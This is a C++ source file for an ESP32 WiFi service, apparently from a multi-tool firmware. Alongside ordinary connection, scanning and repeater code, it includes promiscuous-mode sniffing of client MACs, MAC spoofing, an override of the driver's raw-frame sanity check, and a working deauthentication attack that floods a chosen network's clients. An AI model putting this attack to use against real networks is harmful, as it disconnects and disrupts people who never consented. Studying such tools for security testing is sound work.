#include "WifiService.h"
#include "Transformers/ArgTransformer.h"

bool WifiService::setStartupHostname(const std::string& hostname) {
    ArgTransformer transformer;
    return transformer.isValidHostname(hostname) && WiFi.setHostname(hostname.c_str());
}

WifiService::WifiService() : connected(false) {
    if (WiFi.getMode() == WIFI_MODE_NULL) {
        WiFi.mode(WIFI_STA);
    }
}

bool WifiService::connect(const std::string& ssid, const std::string& password, unsigned long timeoutMs) {
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startAttemptTime = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < timeoutMs) {
        delay(100);
    }

    connected = WiFi.status() == WL_CONNECTED;
    return connected;
}

void WifiService::disconnect() {
    WiFi.disconnect(true);
    connected = false;
}

bool WifiService::isConnected() const {
    return WiFi.status() == WL_CONNECTED;
}

std::string WifiService::getLocalIP() const {
    return WiFi.localIP().toString().c_str();
}

std::string WifiService::getCurrentIP() const {
    if (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA) {
        return WiFi.softAPIP().toString().c_str();
    }
    return WiFi.localIP().toString().c_str();
}

std::string WifiService::getSubnetMask() const {
    return std::string(WiFi.subnetMask().toString().c_str());
}

std::string WifiService::getGatewayIp() const {
    return std::string(WiFi.gatewayIP().toString().c_str());
}

std::string WifiService::getDns1() const {
    return std::string(WiFi.dnsIP(0).toString().c_str());
}

std::string WifiService::getDns2() const {
    return std::string(WiFi.dnsIP(1).toString().c_str());
}

std::string WifiService::getHostname() const {
    const char* h = WiFi.getHostname();
    return std::string(h ? h : "");
}

std::string WifiService::getApIp() const {
    return std::string(WiFi.softAPIP().toString().c_str());
}

int WifiService::getRssi() const {
    return WiFi.RSSI();
}

int WifiService::getChannel() const {
    return WiFi.channel();
}

int WifiService::getWifiModeRaw() const {
    return static_cast<int>(WiFi.getMode());
}

int WifiService::getWifiStatusRaw() const {
    return static_cast<int>(WiFi.status());
}

bool WifiService::isProvisioningEnabled() const {
    return WiFi.isProvEnabled();
}

std::string WifiService::getSsid() const {
    return std::string(WiFi.SSID().c_str()); 
}

std::string WifiService::getBssid() const {
    return std::string(WiFi.BSSIDstr().c_str());
}

bool WifiService::startAccessPoint(const std::string& ssid, const std::string& password, int channel, int maxConn) {
    // WiFi.mode(WIFI_AP);
    if (password.empty()) {
        return WiFi.softAP(ssid.c_str(), nullptr, channel, false, maxConn);
    } else {
        return WiFi.softAP(ssid.c_str(), password.c_str(), channel, false, maxConn);
    }
}

bool WifiService::stopAccessPoint() {
    return WiFi.softAPdisconnect(true);
}

void WifiService::reset() {
    disconnect();
    WiFi.mode(WIFI_STA);
    connected = false;
}

void WifiService::recoverStaForRetry(bool keepApMode) {
    // Stop any station connection attempt that can break subsequent scans
    esp_wifi_disconnect();
    WiFi.scanDelete();
    delay(100);

    if (keepApMode) {
        WiFi.mode(WIFI_AP_STA);
    } else {
        WiFi.mode(WIFI_STA);
    }

    connected = false;
}

bool WifiService::prepareRawTx(uint8_t channel) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    WiFi.mode(WIFI_STA);

    esp_err_t err = esp_wifi_start();
    if (err != ESP_OK && err != ESP_ERR_WIFI_CONN && err != ESP_ERR_WIFI_STATE) {
        return false;
    }

    err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return err == ESP_OK;
}

void WifiService::setModeApSta() {
    WiFi.mode(WIFI_AP_STA);
}

void WifiService::setModeApOnly() {
    WiFi.mode(WIFI_AP);
}

std::string WifiService::getLocalIp() const {
    String ip = WiFi.localIP().toString();
    return std::string(ip.c_str());
}

std::vector<std::string> WifiService::scanNetworks() {
    std::vector<std::string> results;

    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; ++i) {
        results.push_back(WiFi.SSID(i).c_str());
    }

    return results;
}

std::vector<WiFiNetwork> WifiService::scanDetailedNetworks() {
    std::vector<WiFiNetwork> networks;
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; i++) {
        WiFiNetwork network;
        network.ssid = WiFi.SSID(i).c_str();
        if (network.ssid.empty()) network.ssid = "Hidden SSID";
        network.rssi = WiFi.RSSI(i);
        network.encryption = WiFi.encryptionType(i);
        network.open = (network.encryption == WIFI_AUTH_OPEN);
        network.vulnerable = isVulnerable(network.encryption);

        char mac[18];
        uint8_t* bssid = WiFi.BSSID(i);
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 bssid[0], bssid[1], bssid[2],
                 bssid[3], bssid[4], bssid[5]);
        network.bssid = mac;

        network.channel = WiFi.channel(i);
        network.hidden = (network.ssid == "Hidden SSID");

        networks.push_back(network);
    }

    return networks;
}


std::vector<WiFiNetwork> WifiService::getOpenNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> open;
    for (auto net : networks) {
        if (net.open) open.push_back(net);
    }
    return open;
}

bool WifiService::isVulnerable(int encryption) const {
    return encryption == WIFI_AUTH_WEP || encryption == WIFI_AUTH_WPA_PSK;
}

std::vector<WiFiNetwork> WifiService::getVulnerableNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> vuln;
    for (auto net : networks) {
        if (net.encryption == WIFI_AUTH_WEP || net.encryption == WIFI_AUTH_WPA_PSK) {
            WiFiNetwork copy = net;
            copy.vulnerable = true;
            vuln.push_back(copy);
        }
    }
    return vuln;
}


std::string WifiService::encryptionTypeToString(int enc) {
    switch (static_cast<wifi_auth_mode_t>(enc)) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI";
        default: return "UNKNOWN";
    }
}

int8_t WifiService::scanRssiOnChannel(uint8_t channel)
{
    // reset old results
    esp_wifi_clear_ap_list();

    wifi_scan_config_t config{};
    config.channel = channel;
    config.show_hidden = true;
    config.scan_type = WIFI_SCAN_TYPE_PASSIVE;
    config.scan_time.passive = 200; 

    esp_err_t err = esp_wifi_scan_start(&config, true);
    if (err != ESP_OK) {
        esp_wifi_clear_ap_list();
        return -127;
    }

    uint16_t apCount = 0;
    err = esp_wifi_scan_get_ap_num(&apCount);
    if (err != ESP_OK || apCount == 0) {
        esp_wifi_clear_ap_list();
        return -127;
    }

    const uint16_t MAX_AP = 32;
    if (apCount > MAX_AP) apCount = MAX_AP;

    wifi_ap_record_t list[MAX_AP];
    uint16_t n = apCount;

    err = esp_wifi_scan_get_ap_records(&n, list);
    if (err != ESP_OK || n == 0) {
        esp_wifi_clear_ap_list();
        return -127;
    }

    int sum = 0;
    for (uint16_t i = 0; i < n; ++i) {
        sum += list[i].rssi;
    }

    esp_wifi_clear_ap_list();
    return sum / (int)n;
}

void WifiService::pktCountCb(void* buf, wifi_promiscuous_pkt_type_t)
{
    (void)buf;
    g_pktCount++;
}

uint32_t WifiService::countPacketsOnChannel(uint8_t channel, uint16_t dwellMs)
{
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    g_pktCount = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&pktCountCb);
    esp_wifi_set_promiscuous(true);

    uint32_t start = millis();
    while (millis() - start < dwellMs) {
        delay(1);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    return g_pktCount;
}

void WifiService::startPassiveSniffing() {
    disconnect();

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    WiFi.mode(WIFI_STA);
    esp_wifi_start();

    esp_wifi_set_promiscuous_rx_cb(&WifiService::snifferCallback);
    esp_wifi_set_promiscuous(true);
}

void WifiService::stopPassiveSniffing() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    sniffLog.clear();
    WiFi.mode(WIFI_STA);
    esp_wifi_start();
}

void WifiService::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t) {
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t ch = pkt->rx_ctrl.channel;

    uint8_t type = 0, subtype = 0;
    extractTypeSubtype(payload, type, subtype);
    std::string typeStr = getFrameTypeName(type, subtype);
    std::string macStr = formatMac(payload + 10);

    std::string line = "CH:" + std::to_string(ch) +
                       " RSSI:" + std::to_string(rssi) +
                       " Type:" + typeStr;

    // Add SSID if possible
    if (type == 0 && (subtype == 8 || subtype == 4)) {
        std::string ssid = parseSsidFromPacket(payload, len, type, subtype);
        if (!ssid.empty()) {
            line += " SSID:\"" + ssid + "\"";
        }
    }

    line += " MAC:" + macStr;

    portENTER_CRITICAL(&sniffMux);
    if (sniffLog.size() < 200) sniffLog.push_back(line);
    portEXIT_CRITICAL(&sniffMux);
}

std::vector<std::string> WifiService::getSniffLog() {
    std::vector<std::string> copy;

    portENTER_CRITICAL(&sniffMux);
    copy.swap(sniffLog);
    portEXIT_CRITICAL(&sniffMux);

    return copy;
}

bool WifiService::switchChannel(uint8_t channel) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return err == ESP_OK;
}

std::string WifiService::formatMac(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

std::string WifiService::getFrameTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8);
    type = (fc & 0x000C) >> 2;
    subtype = (fc & 0x00F0) >> 4;
    return std::to_string(type) + "/" + std::to_string(subtype);
}

std::string WifiService::parseSsidFromPacket(const uint8_t* payload, int len, uint8_t type, uint8_t subtype) {
    int offset = 24;
    if (type == 0 && subtype == 8) offset = 36;

    while (offset + 2 <= len) {
        uint8_t id = payload[offset];
        uint8_t elen = payload[offset + 1];
        if (offset + 2 + elen > len) break;

        if (id == 0) {
            return std::string(reinterpret_cast<const char*>(payload + offset + 2), elen);
        }

        offset += 2 + elen;
    }

    return "";
}

std::string WifiService::getFrameTypeName(uint8_t type, uint8_t subtype) {
    if (type == 0) {
        switch (subtype) {
            case 0:  return "Assoc Req";
            case 1:  return "Assoc Resp";
            case 4:  return "Probe Req";
            case 5:  return "Probe Resp";
            case 8:  return "Beacon";
            case 10: return "Disassoc";
            case 11: return "Auth";
            case 12: return "Deauth";
            default: return "Mgmt/" + std::to_string(subtype);
        }
    } else if (type == 1) {
        return "Ctrl/" + std::to_string(subtype);
    } else if (type == 2) {
        if (subtype == 0) return "Data";
        if (subtype == 4) return "Null Data";
        return "Data/" + std::to_string(subtype);
    }
    return "Unknown";
}

void WifiService::extractTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8);
    type = (fc & 0x0C) >> 2;
    subtype = (fc & 0xF0) >> 4;
}

bool WifiService::spoofMacAddress(const std::string& macStr, MacInterface which) {
    if (macStr.length() != 17) return false;

    uint8_t mac[6];
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }

    for (int i = 0; i < 6; ++i)
        mac[i] = static_cast<uint8_t>(values[i]);

    mac[0] &= 0xFE; // unicast

    WiFi.disconnect(true);
    delay(100);

    // Trad enum to interface
    wifi_interface_t iface = (which == MacInterface::Station) ? WIFI_IF_STA : WIFI_IF_AP;

    // Mode
    if (iface == WIFI_IF_STA) {
        WiFi.mode(WIFI_MODE_STA);
    } else {
        WiFi.mode(WIFI_MODE_AP);
    }

    esp_err_t err = esp_wifi_set_mac(iface, mac);
    if (err != ESP_OK) {
        return false;
    }

    esp_wifi_start();
    return true;
}

std::string WifiService::getMacAddressSta() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    char buf[18];
    return formatMac(mac);
}

std::string WifiService::getMacAddressAp() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    char buf[18];
    return formatMac(mac);
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t)
{
    // Override function to avoid linker errors
    return 0;
}

void WifiService::clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* hdr = p->payload;

    // To-DS = 1, From-DS = 0
    if ((hdr[1] & 0x03) != 0x01) return;

    const uint8_t* ap  = hdr + 4;   // addr1
    const uint8_t* sta = hdr +10;   // addr2

    if (memcmp(ap, apBSSID, 6) != 0) return;   // different BSSID

    std::array<uint8_t,6> mac;
    memcpy(mac.data(), sta, 6);

    portENTER_CRITICAL_ISR(&staMux);
    bool seen=false;
    for (auto& e : staList) if (e == mac) { seen=true; break; }
    if (!seen) staList.push_back(mac);
    portEXIT_CRITICAL_ISR(&staMux);
}

void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel, uint8_t bursts, uint32_t sniffMs)
{
    if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_AP);
        esp_wifi_start();
    }

    std::vector<std::array<uint8_t,6>> clients;

    memcpy(apBSSID, bssid, 6);
    staList.clear();

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);

    uint32_t start = millis();
    while (millis() - start < sniffMs) delay(1);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    portENTER_CRITICAL(&staMux);
    clients = staList;
    portEXIT_CRITICAL(&staMux);

    // Deauth frame
    uint8_t pkt[26] = {
        0xc0,0x00,                          // Frame control
        0x00,0x00,                          // Duration
        0xff,0xff,0xff,0xff,0xff,0xff,      // addr1 = target
        0x00,0x00,0x00,0x00,0x00,0x00,      // addr2 = source
        0x00,0x00,0x00,0x00,0x00,0x00,      // addr3 = BSSID
        0x00,0x00,                          // Fragment & sequence number
        0x02,0x00                           // Reason code, 2 = previous authentication no longer valid
    };
    memcpy(&pkt[16], bssid, 6);            // addr3 always AP

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (int i=0;i<bursts;i++) {
        memcpy(&pkt[10], bssid, 6);        // addr2 = AP
        memcpy(&pkt[4] , "\xff\xff\xff\xff\xff\xff",6);
        esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);

        for (auto& sta: clients) {
            memcpy(&pkt[4],  sta.data(),6);  // addr1 = STA
            esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);
        }
        delay(1);
    }
}

bool WifiService::deauthApBySsid(const std::string& ssid)
{
    auto nets = scanDetailedNetworks();
    for (auto& n : nets) {
        if (n.ssid == ssid) {
            uint8_t bssid[6];
            sscanf(n.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
            // Hardcoded 30 bursts and 400ms sniffing time
            deauthAttack(bssid, n.channel, 30, 400);
            return true;                    // success
        }
    }
    return false;                           // SSID not found
}

bool WifiService::startRepeater(const std::string& staSsid,
                                const std::string& staPass,
                                const std::string& apSsid,
                                const std::string& apPass,
                                int apChannel,
                                int maxConn,
                                unsigned long timeoutMs)
{
    // stop anything already running
    stopRepeater();

    // AP+STA
    WiFi.mode(WIFI_AP_STA);

    // AP IP
    IPAddress ap_ip(192, 168, 4, 1);
    IPAddress ap_gw(192, 168, 4, 1);
    IPAddress ap_mask(255, 255, 255, 0);
    WiFi.softAPConfig(ap_ip, ap_gw, ap_mask);

    // Start AP
    bool ap_ok = false;
    if (apPass.empty()) {
        ap_ok = WiFi.softAP(apSsid.c_str(), nullptr, apChannel, false, maxConn);
    } else {
        ap_ok = WiFi.softAP(apSsid.c_str(), apPass.c_str(), apChannel, false, maxConn);
    }
    if (!ap_ok) return false;

    // Start STA uplink
    WiFi.begin(staSsid.c_str(), staPass.c_str());

    unsigned long t0 = millis();
    while (WiFi.status() != WL_CONNECTED && (millis() - t0) < timeoutMs) {
        delay(50);
    }
    if (WiFi.status() != WL_CONNECTED) {
        connected = false;
        return false; // AP stays up, but no uplink
    }

    // Disable PS for better throughput/latency
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Get netifs
    esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA");

    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP");

    if (!sta_netif || !ap_netif) {
        connected = false;
        return false;
    }

    // DNS forwarding
    esp_netif_dns_info_t dns{};
    if (esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns) == ESP_OK) {
        // restart dhcps with DNS option enabled
        esp_netif_dhcps_stop(ap_netif);

        uint8_t offer_dns = 0x02; // DHCPS_OFFER_DNS
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                               &offer_dns, sizeof(offer_dns));

        esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
        esp_netif_dhcps_start(ap_netif);
    }

    // Enable NAT
    esp_err_t nat_err = esp_netif_napt_enable(ap_netif);
    if (nat_err != ESP_OK) {
        connected = false;
        return false;
    }

    connected = true;
    repeater = true;
    return true;
}

void WifiService::stopRepeater()
{
    // Stop NAT
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif) ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP");
    if (ap_netif) {
        // ignore errors
        esp_netif_napt_disable(ap_netif);
    }

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    repeater = false;
}

bool WifiService::isRepeaterRunning() const {
    return repeater;
}

std::string WifiService::getRepeaterIp() const {
    if (!repeater) return "";
    return std::string(WiFi.softAPIP().toString().c_str());
}
